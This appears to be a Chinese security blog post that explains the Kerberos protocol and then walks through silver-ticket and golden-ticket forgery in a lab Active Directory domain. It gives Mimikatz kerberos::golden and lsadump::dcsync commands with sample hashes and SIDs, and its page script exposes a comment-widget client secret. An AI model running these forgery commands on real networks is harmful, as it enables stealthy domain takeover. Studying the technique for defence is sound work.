@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="信息安全研究方向，目前着力于Web安全与渗透测试，向往Open、Free、Share的黑客精神。同时也是一名业余ctf。"><title>Kerberos协议到票据伪造 | zjun's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = 'https://hm.baidu.com/hm.js?' + '2bd5b990e2605fea321851cd73e77f93';
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+  })();
+</script><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Kerberos协议到票据伪造</h1><a id="logo" href="/.">zjun's blog</a><p class="description">潜心习安全</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/timeline/"><i class="fa fa-history"> 时间线</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a target="_blank" rel="noopener" href="https://tools.zjun.info/"><i class="fa fa-cube"> Tools</i></a><a target="_blank" rel="noopener" href="https://github.com/z1un"><i class="fa fa-github"> Github</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Kerberos协议到票据伪造</h1><div class="post-meta">2020-08-25<span> | </span><span class="category"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Kerberos%E5%8D%8F%E8%AE%AE%E7%AE%80%E5%8C%96%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 Kerberos协议简化描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Kerberos%E5%8D%8F%E8%AE%AE%E5%85%B7%E4%BD%93%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">0x02 Kerberos协议具体流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86"><span class="toc-number">2.1.</span> <span class="toc-text">用户登陆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81"><span class="toc-number">2.2.</span> <span class="toc-text">客户端认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%88%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">服务授权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E8%AF%B7%E6%B1%82"><span class="toc-number">2.4.</span> <span class="toc-text">服务请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AESilver-Ticket%E4%BC%AA%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">0x03 白银票据Silver Ticket伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEGolden-Ticket%E4%BC%AA%E9%80%A0"><span class="toc-number">4.</span> <span class="toc-text">0x04 黄金票据Golden Ticket伪造</span></a></li></ol></div></div><div class="post-content"><p>目前域环境中使用的认证协议基本都是<code>Kerberos</code>，所以把<code>Kerberos</code>协议理解透彻对域渗透来说极其重要。</p>
+<a id="more"></a>
+<p><img src="https://oss.zjun.info/zjun.info/UsgRjNOfKrpAWPk.webp" alt="UsgRjNOfKrpAWPk"></p>
+<p>图片来自：</p>
+<p><a target="_blank" rel="noopener" href="http://web.mit.edu/kerberos/">http://web.mit.edu/kerberos/</a></p>
+<h2 id="0x01-Kerberos协议简化描述"><a href="#0x01-Kerberos协议简化描述" class="headerlink" title="0x01 Kerberos协议简化描述"></a>0x01 Kerberos协议简化描述</h2><p>上面的图片就是<code>Kerberos</code>的<code>logo</code>，形象为三个狗头，正好符合<code>Kerberos</code>协议中的<code>三个</code>主要角色:</p>
+<ul>
+<li>Client = 访问服务的客户端</li>
+<li>Server = 提供服务的服务端</li>
+<li>Key Distribution Center（KDC）= 密钥分发中心 = Domain Controller（DC）</li>
+</ul>
+<p>其中<code>KDC</code>又包含以下两部分：</p>
+<ul>
+<li>Authentication Server（AS）= 认证服务</li>
+<li>Ticket Granting Server（TGS）= 票据授权服务</li>
+</ul>
+<p><img src="https://oss.zjun.info/zjun.info/7UptSByn4RarV8b.webp" alt="7UptSByn4RarV8b"></p>
+<p><code>Kerberos</code>协议简要描述如下：</p>
+<ol>
+<li><p>客户端发送自己的用户名到<code>KDC</code>服务器以向<code>AS</code>服务进行认证。</p>
+</li>
+<li><p><code>KDC</code>服务器会生成相应的<code>TGT</code>(<code>Ticket Granting Ticket</code>)票据，打上时间戳，在本地数据库中查找该用户的密码，并用该密码对<code>TGT</code>进行加密，将结果发还给客户端。</p>
+</li>
+<li><p>客户端收到该信息，使用自己的密码进行解密之后，得到<code>TGT</code>票据。这个<code>TGT</code>会在一段时间之后失效，也有一些会话管理器(<code>session manager</code>)能在用户登陆期间进行自动更新。</p>
+</li>
+<li><p>当客户端需要使用一些特定服务的时候，客户端就发送<code>TGT</code>到<code>KDC</code>服务器中的<code>TGS</code>服务。</p>
+</li>
+<li><p>当该用户的<code>TGT</code>验证通过并且其有权访问所申请的服务时，<code>TGS</code>服务会生成一个该服务所对应的票据(<code>ticket</code>)和会话密钥(<code>session key</code>)，并发还给客户端。</p>
+</li>
+<li><p>客户端将服务请求与该<code>ticket</code>一并发送给相应的服务端即可。</p>
+</li>
+</ol>
+<h2 id="0x02-Kerberos协议具体流程"><a href="#0x02-Kerberos协议具体流程" class="headerlink" title="0x02 Kerberos协议具体流程"></a>0x02 Kerberos协议具体流程</h2><h3 id="用户登陆"><a href="#用户登陆" class="headerlink" title="用户登陆"></a>用户登陆</h3><p><strong>用户使用客户端上的程序进行登陆</strong>。</p>
+<p>用户需要在客户端上输入用户<code>ID</code>与密码，客户端程序运行一个单向函数(<code>One-way function</code>)把密码转换成密钥，这个就是客户端(<code>Client</code>)的用户密钥(<code>user&#39;s secret key</code>)。</p>
+<h3 id="客户端认证"><a href="#客户端认证" class="headerlink" title="客户端认证"></a>客户端认证</h3><p><strong>客户端(<code>Client</code>)从认证服务器(<code>AS</code>)获取票据授权票据<code>Ticket Granting Ticket</code>简称<code>TGT</code>。</strong></p>
+<ol>
+<li><p>客户端向<code>AS</code>发送一条明文信息，用以申请对某服务的访问。</p>
+<p>但是这里用户不向<code>AS</code>发送用户密钥(<code>user&#39;s secret key</code>)，也不发送密码，该<code>AS</code>能够从本地数据库中查询到该申请用户的密码，并通过与客户端相同的途径转换成相同的用户密钥(<code>user&#39;s secret key</code>)。</p>
+</li>
+<li><p><code>AS</code>检查该用户<code>ID</code>是否存在于本地数据库中，如果存在则返回两条信息：</p>
+<ul>
+<li><p><code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)，该<code>Session Key</code>用在将来<code>Client</code>与<code>TGS</code>的通信上，并通过用户密钥(<code>user&#39;s secret key</code>)进行加密。</p>
+</li>
+<li><p>票据授权票据(<code>TGT</code>)，<code>TGT</code>包括：<code>Client/TGS会话密钥</code>，用户<code>ID</code>，用户网址，<code>TGT</code>有效期，并通过<code>TGS</code>密钥(<code>TGS&#39;s secret key</code>)进行加密。</p>
+</li>
+</ul>
+</li>
+<li><p>当<code>Client</code>收到上一步的两条消息后，<code>Client</code>首先尝试用自己的用户密钥(<code>user&#39;s secret key</code>)解密<code>Client/TGS会话密钥</code>，如果用户输入的密码与<code>AS</code>数据库中的密码不符，则不能成功解密。输入正确的密码并通过随之生成的<code>user&#39;s secret key</code>才能解密，从而得到<code>Client/TGS会话密钥</code>。</p>
+</li>
+</ol>
+<h3 id="服务授权"><a href="#服务授权" class="headerlink" title="服务授权"></a>服务授权</h3><p><strong><code>Client</code>从<code>TGS</code>获取票据(<code>client-to-server ticket</code>)</strong></p>
+<ol>
+<li><p>当<code>Client</code>需要申请特定服务时，会向<code>TGS</code>发送以下两条消息：</p>
+<ul>
+<li><code>AS</code>向<code>Client</code>返回的票据授权票据<code>TGT</code>，以及需要获取服务的服务<code>ID</code>。</li>
+<li>认证符(<code>Authenticator</code>)，其包括：用户<code>ID</code>，时间戳，并通过<code>Client/TGS会话密钥</code>进行加密。</li>
+</ul>
+</li>
+<li><p>收到以上两条消息后，<code>TGS</code>首先检查<code>KDC</code>数据库中是否存在所需的服务，查找到之后，<code>TGS</code>用自己的TGS密钥(<code>TGS&#39;s secret key</code>)解密<code>TGT</code>，从而得到之前生成的<code>Client/TGS会话密钥</code>。<code>TGS</code>再用这个会话密钥解密得到包含用户<code>ID</code>和时间戳的<code>Authenticator</code>，并对<code>TGT</code>和<code>Authenticator</code>进行验证，验证通过之后返回两条消息：</p>
+<ul>
+<li><code>Client-Server</code>票据(<code>client-to-server ticket</code>)，该票据包括：<code>Client/SS</code>会话密钥 (<code>Client/Server Session Key</code>），用户<code>ID</code>，用户网址，有效期），并通过提供该服务的服务器密钥(<code>service&#39;s secret key</code>)进行加密。</li>
+<li><code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)，该会话密钥用在将来<code>Client</code>与<code>Server Service</code>的通信上，并通过<code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)进行加密。</li>
+</ul>
+</li>
+<li><p><code>Client</code>收到这些消息后，用<code>Client/TGS</code>会话密钥(<code>Client/TGS Session Key</code>)解密得到<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)。</p>
+</li>
+</ol>
+<h3 id="服务请求"><a href="#服务请求" class="headerlink" title="服务请求"></a>服务请求</h3><p><strong><code>Client</code>从<code>Server</code>获取服务</strong></p>
+<ol>
+<li>当获得<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)之后，<code>Client</code>就能够使用服务器提供的服务了。<code>Client</code>向指定服务器<code>Server</code>发出两条消息：<ul>
+<li>上一步的<code>Client-Server</code>票据(<code>client-to-server ticket</code>)，并通过服务器密钥(<code>service&#39;s secret key</code>)进行加密。</li>
+<li>新的<code>Authenticator</code>包括：用户<code>ID</code>，时间戳，并通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)进行加密。</li>
+</ul>
+</li>
+<li><code>Server</code>用自己的密钥<code>service&#39;s secret key</code>解密<code>Client-Server</code>票据得到<code>TGS</code>提供的<code>Client/SS</code>会话密钥<code>Client/Server Session Key</code>。再用这个会话密钥解密得到新的<code>Authenticator</code>，再对<code>Ticket</code>和<code>Authenticator</code>进行验证，验证通过则返回一条消息：<ul>
+<li>新时间戳，新时间戳是：<code>Client</code>发送的时间戳加<code>1</code>(<code>Kerberos</code>版本<code>5</code>已经取消这一做法），并通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)进行加密。</li>
+</ul>
+</li>
+<li><code>Client</code>通过<code>Client/SS</code>会话密钥(<code>Client/Server Session Key</code>)解密得到<code>新时间戳</code>并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器<code>Server</code>发送服务请求。</li>
+<li>服务器<code>Server</code>向客户端<code>Client</code>提供相应的服务。</li>
+</ol>
+<p><img src="https://oss.zjun.info/zjun.info/3.webp" alt="3"></p>
+<h2 id="0x03-白银票据Silver-Ticket伪造"><a href="#0x03-白银票据Silver-Ticket伪造" class="headerlink" title="0x03 白银票据Silver Ticket伪造"></a>0x03 白银票据Silver Ticket伪造</h2><p>白银票据伪造的是<code>TGS</code>的票据，是一个点对点的有效凭证。</p>
+<p>正常情况下一个非域管权限的域内用户访问域控的文件共享是拒绝访问的。</p>
+<p><img src="https://oss.zjun.info/zjun.info/uFHzxmCnGAbjM7J.webp" alt="uFHzxmCnGAbjM7J"></p>
+<p>下面来伪造白银票据来让<code>Client</code>端的该用户具有访问权限：</p>
+<ul>
+<li><p>得到域控管理员<code>NTLM Hash</code>：<code>ec9c6ab085b32841da1a0c61466b959b</code></p>
+<p><img src="https://oss.zjun.info/zjun.info/4.webp" alt="4"></p>
+<p>得到域<code>SID</code>：<code>S-1-5-21-3446166583-1116429469-1279190574</code></p>
+<p><img src="https://oss.zjun.info/zjun.info/5.webp" alt="5"></p>
+<ul>
+<li>当前域名是<code>zjun.com</code>，伪造的用户名为<code>test</code>，服务伪造<code>cifs</code>，需要访问的主机是<code>dc.zjun.com</code>，在<code>Client</code>利用<code>Mimikatz</code>执行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden &#x2F;domain:zjun.com &#x2F;sid:S-1-5-21-3446166583-1116429469-1279190574 &#x2F;target:dc.zjun.com &#x2F;rc4:ec9c6ab085b32841da1a0c61466b959b &#x2F;service:cifs &#x2F;user:test &#x2F;ptt</span><br><span class="line"></span><br><span class="line">&#x2F;domain: 域名称 </span><br><span class="line">&#x2F;sid: 域SID </span><br><span class="line">&#x2F;target: 目标主机名 </span><br><span class="line">&#x2F;service: 服务类型 </span><br><span class="line">&#x2F;rc4: 用户NTLM hash</span><br><span class="line">&#x2F;user: 伪造的随意用户名 </span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/6.webp" alt="6"></p>
+<p>可以看到内存中已经有了票据</p>
+</li>
+</ul>
+<p><img src="https://oss.zjun.info/zjun.info/7.webp" alt="7"></p>
+<p>现在也有了权限访问<code>DC</code>的文件共享了</p>
+<p><img src="https://oss.zjun.info/zjun.info/8.webp" alt="8"></p>
+<p>也可以利用<code>psexec</code>弹回<code>cmd</code></p>
+<p><img src="https://oss.zjun.info/zjun.info/9.webp" alt="9"></p>
+<h2 id="0x04-黄金票据Golden-Ticket伪造"><a href="#0x04-黄金票据Golden-Ticket伪造" class="headerlink" title="0x04 黄金票据Golden Ticket伪造"></a>0x04 黄金票据Golden Ticket伪造</h2><p>黄金票据伪造的是<code>TGT</code>，是一个任意服务的认证凭据。</p>
+<p>伪造黄金票据最主要得是需要获得<code>krbtgt</code>用户的<code>NTLM hash</code>，在拿下域控后可以抓取<code>kerbtgt</code>的<code>NTLM hash</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="built_in">log</span> <span class="string">&quot;lsadump::dcsync /domain:zjun.com /user:krbtgt&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/10.webp" alt="10"></p>
+<p>然后便可容易在域内其他主机或可以访问到域的主机上伪造黄金票据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:zjun.com /sid:S-1-5-21-3446166583-1116429469-1279190574 /krbtgt:66ad458513450343d7625cd1bc6f7262 /ptt</span><br><span class="line"> </span><br><span class="line">/admin：伪造的任意用户名</span><br><span class="line">/domain：域名称</span><br><span class="line">/sid：域SID</span><br><span class="line">/krbtgt：krbtgt用户的NTLM <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://oss.zjun.info/zjun.info/11.webp" alt="11"></p>
+<p>可以很隐蔽的控制整个域环境。</p>
+<p><img src="https://oss.zjun.info/zjun.info/12.webp" alt="12"></p>
+</div><div id="donate"><link rel="stylesheet" type="text/css" href="/css/donate.css"><script type="text/javascript" src="/js/donate.js" successtext="复制成功!"></script><a class="pos-f tr3" id="github" target="_blank" rel="noopener" href="https://github.com/z1un" arget="_blank" title="Github"></a><div id="DonateText">Donate</div><ul class="list pos-f" id="donateBox"><li id="AliPay" qr="/img/AliPayQR.png"></li><li id="WeChat" qr="/img/WeChatQR.png"></li></ul><div class="pos-f left-100" id="QRBox"><div id="MainBox"></div></div></div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css"><p><span>本文标题：</span>Kerberos协议到票据伪造</p><p><span>文章作者：</span>zjun</p><p><span>发布时间：</span>2020-08-25</p><!--p--><!--    span= __('copyright_update_prefix')--><!--    = page.updated.format(config.date_format)--><p><span>原始链接：</span><a href="/2020/kerberos-protocol-to-ticket-forgery.html">https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html"></i></span></p><p><span>版权声明：</span>本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！</p></div><br><script type="text/javascript" src="/js/share.js?v=1.0.0" async></script><a class="article-share-link" data-url="https://blog.zjun.info/2020/kerberos-protocol-to-ticket-forgery.html" data-id="ckl94f9ul001cawrycvrw60l7" data-qrcode="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsUlEQVR42u3aQW4jMQwEQP//015grxs73aSUeIGaUzBGZlQ0INIUH4/4ev69/r3z6n7yhPdPe764HjcuPDw8vNHS3z/u/YsTwOyN+RpehgAPDw/vGu/9Vp68Jt/Q2zSThxIPDw/v03h5GkjYbUDx8PDw/kdesmW3n7ZJCA8PD+9zeHlroF103m5oQ3C414KHh4cX89oDsE/4++L5Hh4eHt7iIKpNFW3hm2/lw3Xi4eHh3doCH20x+lxc71sbbRMkShh4eHh4F3izf86bCG17d5ZIIjAeHh7empcf1ecpIQcf+DbePw0PDw/vB3ntwVj+tOROfvQVZTk8PDy8a7zNb/l8pKBtNOQB+iYx4OHh4R3l5Q2CWVP11GhUHUQ8PDy8a7zN0NWmmJ41NYqUhoeHh3eN1xbBSUk9SwankF/kPTw8PLwLvE3JuxmZmrU5oi8ADw8P7wJvVi7Pxqry5eYhi9aGh4eHd5TXjknVRW3cnmiTRPQuPDw8vGu8fMipHcOadVOPFet4eHh4F3izk6O2dN4nnjyRREg8PDy8NS9/WT4QcKpkzxsZUfbDw8PDO8TLy9y2FTtrJWxaukXGw8PDwzvEO9vSbcO0aVsMkXh4eHgl7+yB/ay83qSHb9h4eHh4F3jt5j4bz2obHO3A1oGZMjw8PLxFXXq2afssr00Iit8HeHh4eGteu93PUshs7CAv+l8GBQ8PD+9HeLNWwoxRLHSW2PDw8PCO8jYlb1uItwFqg/XFe/Hw8PAu8GYbbtImyMcRZkV8wsbDw8O7x5u1AJKYtQ2F/FCtKNDx8PDwrvH2BfGswG0bH/UT8PDw8D6SlyePfOn5Yds3BT0eHh7er/Lyhyb328I9SQN4eHh4P8lrD582AwFJG3dFwsPDw7vM2xS4bTj2o1pJ6sLDw8O7xvsDLgr5PhMfiowAAAAASUVORK5CYII=">分享</a><div class="tags"><a href="/tags/windows/"><i class="fa fa-tag"></i>windows</a><a href="/tags/kerberos/"><i class="fa fa-tag"></i>kerberos</a><a href="/tags/%E5%9F%9F/"><i class="fa fa-tag"></i>域</a><a href="/tags/Ticket/"><i class="fa fa-tag"></i>Ticket</a><a href="/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"><i class="fa fa-tag"></i>黄金票据</a><a href="/tags/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"><i class="fa fa-tag"></i>白银票据</a></div><div class="post-nav"><a class="pre" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a><a class="next" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=1.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=1.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=1.0.0"></script><script>var gitalk = new Gitalk({
+  clientID: 'a29c90b69a24ed5a320d',
+  clientSecret: '62b4bde8f0a28a1a782e49c56380cb10d365cd87',
+  repo: 'gitalk',
+  owner: 'z1un',
+  admin: ['z1un'],
+  id: md5(location.pathname),
+  distractionFreeMode: false
+})
+gitalk.render('container')
+</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Other/">Other</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/attacking-jwt-authentication.html">JWT鉴权攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/about-the-online-tools-site.html">关于在线工具站点</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/z1-aggressorscripts.html">最近写的一款Cobalt Strike插件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/analysis-of-flask-ssti-template-injection.html">浅析Flask SSTI模板注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/neovim-configuration-file-in-a-fast-scripting-scenario.html">快速脚本编写场景下的neovim配置文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/kerberos-protocol-to-ticket-forgery.html">Kerberos协议到票据伪造</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ntlm-authentication-to-pth-attack.html">NTLM认证协议到Pass The Hash攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/ciscn-2020-preliminaries.html">CISCN 2020 线上初赛部分WriteUp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/from-windows-local-authentication-to-obtaining-hash.html">由Windows本地认证到Hash抓取</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/talking-about-intranet-penetration-agent.html">浅谈内网渗透代理</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.w3bsafe.cn/" title="w3bsafe安全团队" target="_blank">w3bsafe安全团队</a><ul></ul><a href="http://www.c-hasel.cn/" title="Corey" target="_blank">Corey</a><ul></ul><a href="http://www.snow404.cn/" title="snow" target="_blank">snow</a><ul></ul><a href="http://www.hackxc.cc/" title="小陈" target="_blank">小陈</a><ul></ul><a href="https://0x20h.com/" title="Sp4ce" target="_blank">Sp4ce</a><ul></ul><a href="https://blog.cdusec.com/" title="成都大学信息安全内部博客" target="_blank">成都大学信息安全内部博客</a><ul></ul><a href="https://dna049.com/" title="dna049" target="_blank">dna049</a><ul></ul><a href="https://jokerm.com/" title="JokerM's Palace" target="_blank">JokerM's Palace</a><ul></ul><a href="https://superj.site/" title="Opt1mus" target="_blank">Opt1mus</a><ul></ul><a href="https://zgao.top/" title="zgao" target="_blank">zgao</a><ul></ul><a href="https://blog.happysec.cn/" title="小北" target="_blank">小北</a><ul></ul><a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><!--#footer= 'Copyright © ' + date(Date.now(), 'YYYY') + ' '--><!--  a(href=url_for('.'), rel='nofollow')= config.title + '.'--><!--  |  Powered by--><!--  a(rel='nofollow', target='_blank', href='https://hexo.io')  Hexo.--><!--  a(rel='nofollow', target='_blank', href='https://github.com/tufu9441/maupassant-hexo')  Theme--><!--  |  by--><!--  a(rel='nofollow', target='_blank', href='https://github.com/pagecho')  Cho.--><div id="footer">Copyright © 2021 <a rel="nofollow" target="_blank" href="https://www.zjun.info"> ZJUN |</a><a rel="nofollow" target="_blank" href="https://beian.miit.gov.cn/"> 蜀ICP备20009085号 |</a><a rel="nofollow" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=51010802000845"> 川公网安备51010802000845号</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=1.0.0"><script type="text/javascript" src="/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+   search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>
